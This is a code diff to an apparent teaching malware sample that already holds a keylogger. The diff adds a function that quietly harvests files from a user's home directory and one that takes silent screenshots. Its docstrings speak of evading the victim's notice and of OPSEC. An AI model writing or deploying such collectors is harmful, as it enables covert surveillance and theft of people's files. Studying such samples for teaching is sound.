@@ -11,8 +11,11 @@ consume these collectors' outputs.
 from __future__ import annotations
 
 import os
+import shutil
+import subprocess
 import threading
-from typing import Optional
+from pathlib import Path
+from typing import Iterable, Optional
 
 
 class _NullBackend:
@@ -192,3 +195,49 @@ class Keylogger:
         snapshot = list(self.buffer)
         self.buffer.clear()
         return snapshot
+
+
+# --- File harvest ---------------------------------------------------------
+
+def harvest_files(home: Path, relative_paths: Iterable[str], *, binary: bool = False) -> dict:
+    """Read a set of files under ``home`` and return a {rel_path: contents} map.
+
+    Missing files are silently skipped — the attacker does not crash if a target
+    does not exist on a given host, because an unhandled exception would generate
+    a stack trace in the victim's terminal and blow OPSEC. This forgiving-by-default
+    behavior is itself part of the R1 teaching point: the sample is clearly *trying*
+    to be quiet even though everything else about it screams.
+    """
+    out: dict = {}
+    home = Path(home)
+    for rel in relative_paths:
+        src = home / rel
+        if not src.is_file():
+            continue
+        try:
+            if binary:
+                out[rel] = src.read_bytes()
+            else:
+                out[rel] = src.read_text(encoding="utf-8", errors="replace")
+        except OSError:
+            continue
+    return out
+
+
+# --- Screenshot -----------------------------------------------------------
+
+def take_screenshot(output_path: Path) -> bool:
+    """Invoke `scrot` to save a PNG at ``output_path``. Return True on success.
+
+    Returns False (not raising) when `scrot` is not installed or the invocation
+    fails — consistent with the forgiving-by-default harvest behavior above.
+    """
+    scrot = shutil.which("scrot")
+    if scrot is None:
+        return False
+    result = subprocess.run(
+        [scrot, "--overwrite", str(output_path)],
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL,
+    )
+    return result.returncode == 0
